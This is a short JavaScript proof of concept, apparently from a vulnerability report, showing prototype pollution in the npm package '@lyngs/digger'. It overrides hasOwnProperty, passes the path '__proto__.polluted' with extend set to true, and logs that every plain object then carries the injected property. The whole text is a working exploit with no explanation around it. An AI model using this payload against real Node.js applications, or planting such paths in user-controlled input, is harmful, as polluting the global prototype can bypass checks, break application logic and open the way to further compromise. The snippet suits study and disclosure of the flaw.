Object.prototype.hasOwnProperty = () => true;
const {digger} = require('@lyngs/digger');
console.log({}.polluted);
digger({}, '__proto__.polluted', 'yes', { extend: true });
console.log({}.polluted);